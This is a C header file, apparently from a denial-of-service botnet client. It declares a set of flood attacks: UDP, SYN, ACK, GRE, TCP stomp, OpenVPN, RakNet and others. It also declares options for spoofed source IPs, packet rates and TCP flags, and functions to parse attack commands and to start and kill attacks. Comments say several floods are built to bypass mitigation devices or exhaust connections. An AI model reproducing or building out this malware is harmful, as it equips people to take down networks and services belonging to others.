#pragma once

#include <arpa/inet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <linux/tcp.h>
#include <time.h>

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/if_ether.h>
#include <errno.h>
#include <sys/select.h>
#include <fcntl.h>

#include "../../utils/headers/includes.h"
#include "../../utils/headers/checksum.h"
#include "../../utils/headers/rand.h"
#include "../../utils/headers/util.h"
#include "../../encryption/chacha20_table.h"
#include "../../utils/headers/protocol.h"
#include "../debug.h"

#define ATTACK_CONCURRENT_MAX 8

#define MAX_FDS 1000

struct flood
{
    struct flood_target *targets;
    struct flood_settings *settings;
    struct flood_flag *options;
    uint8_t num_of_options;
    uint8_t num_of_targets;
    uint16_t duration;
};

struct flood_target
{
    struct sockaddr_in sock_addr;
    uint32_t addr;
    uint8_t netmask;
};

struct flood_settings
{
    int dest_port, tcp_dest_port, source_port, raknet_protocol;
    int length, min_length, max_length;
    int random_data;                             // Randomize payload after each packet? Default is true.
    int syn, ack, urg, psh, rst, fin;            // TCP header flags.
    int seq_rnd, ack_seq_rnd;                    // TCP sequences, default is random.
    int tos, ttl, ident, dont_fragment;          // IP header fields.
    int const_ip;                                // Should the encapsulated destination address be the same as the target?
    int min_pps, max_pps, sleep, csleep, repeat; // Bypass options
    uint32_t source_ip;                          // Source IP used to spoof ip(s).
    char *payload;                               // Custom payload.
};

struct flood_flag
{
    uint8_t id;
    uint8_t val_len;
    char *val;
};

struct tcpbypass_state
{
    int fd;
    int state;
    uint32_t timeout;
};

typedef void (*FLOOD_FUNC)(struct flood *);

enum
{
    FLOOD_UDPPLAIN = 0,   // UDP socket flood with custom payload & min / max packet length.
    FLOOD_UDPRAW = 1,     // UDP RAW flood.
    FLOOD_TCPBYPASS = 2,  // TCP socket flood designed to bypass mitigation devices.
    FLOOD_SYN = 3,        // TCP SYN flood with no packet length.
    FLOOD_ACK = 4,        // TCP ACK flood with custom payload & min / max packet length.
    FLOOD_SYNDATA = 5,    // TCP SYN flood with custom payload & min / max packet length.
    FLOOD_SOCKET = 6,     // TCP 3-way handshake flood with subnet support designed to bypass mitigation devices.
    FLOOD_SOCKETHOLD = 7, // TCP socket hold flood with subnet support designed to max out connections.
    FLOOD_TFO = 8,        // TCP Fast Open flood designed to bypass mitigation devices.
    FLOOD_WRA = 9,        // TCP flood with randomized TCP headers.
    FLOOD_GREIP = 10,     // Layer 3 GRE IP flood.
    FLOOD_STOMP = 11,     // TCP stomp flood.
    FLOOD_HANDSHAKE = 12, // forkys trashy handshake xd
    FLOOD_STD = 13,
    FLOOD_UDPBYPASS = 14,
    FLOOD_OPENVPN = 15,
    FLOOD_RAKNET = 16,

};

enum
{
    OPT_PAYLOAD_SIZE = 0, // What should the size of the packet data be?
    OPT_PAYLOAD_RAND = 1, // Should we randomize the packet data contents?
    OPT_IP_TOS = 2,       // tos field in IP header
    OPT_IP_IDENT = 3,     // ident field in IP header
    OPT_IP_TTL = 4,       // ttl field in IP header
    OPT_IP_DF = 5,        // Dont-Fragment bit set
    OPT_SPORT = 6,        // Should we force a source port? (0 = random)
    OPT_DPORT = 7,        // Should we force a dest port? (0 = random)
    OPT_URG = 11,         // TCP URG header flag
    OPT_ACK = 12,         // TCP ACK header flag
    OPT_PSH = 13,         // TCP PSH header flag
    OPT_RST = 14,         // TCP RST header flag
    OPT_SYN = 15,         // TCP SYN header flag
    OPT_FIN = 16,         // TCP FIN header flag
    OPT_SEQRND = 17,      // Should we force the sequence number? (TCP only)
    OPT_ACKRND = 18,      // Should we force the ack number? (TCP only)
    OPT_GRE_CONSTIP = 19, // Should the encapsulated destination address be the same as the target?
    OPT_SOURCE = 25,      // Source IP
    OPT_RAND_LEN = 26,    // random packet len
    OPT_MIN_LEN = 27,     // random packet len
    OPT_MAX_LEN = 28,     // random packet len
    OPT_PAYLOAD = 29,     // random packet len
    OPT_REPEAT = 30,
    OPT_CSLEEP = 31,
    OPT_MINPPS = 32,
    OPT_MAXPPS = 33,
    OPT_SLEEP = 34,
    OPT_TCP_DEST_PORT = 35,
    OPT_RAKNET_PROTOCOL = 36,
};

struct flood_info
{
    FLOOD_FUNC func;
    uint8_t id;
};

struct stomp_data
{
    uint32_t addr;
    uint32_t seq, ack_seq;
    uint16_t sport, dport;
};

int floods_init(void);
void killall_attacks(void);

void flood_parse(char *, int);
void flood_start(uint8_t, struct flood_flag *, uint8_t, struct flood_target *, uint8_t, uint16_t);
void flood_kill(struct flood *);
FLOOD_FUNC retrieve_flood(int);

char *get_option_string(uint8_t, struct flood_flag *, uint8_t, char *);
char *get_option_hex_string(uint8_t, struct flood_flag *, uint8_t, char *);
int get_option_number(uint8_t, struct flood_flag *, uint8_t, int);
uint32_t get_option_ip(uint8_t, struct flood_flag *, uint8_t, uint32_t);

/* Actual attacks */
void flood_udpraw(struct flood *);
void flood_udpplain(struct flood *);
void flood_std(struct flood *);
void flood_udpbypass(struct flood *);

void flood_udpvse(struct flood *);
void flood_std(struct flood *);

void flood_greip(struct flood *);

void flood_syn(struct flood *);
void flood_ack(struct flood *);
void flood_syndata(struct flood *);

void flood_stomp(struct flood *);
void flood_tfo(struct flood *);
void flood_tcpbypass(struct flood *);
void flood_wra(struct flood *);
void flood_socket(struct flood *);
void flood_sockethold(struct flood *);
void flood_handshake(struct flood *);
void flood_udp_openvpn(struct flood *);
void flood_raknet(struct flood *);

static void add_flood(uint8_t, FLOOD_FUNC);
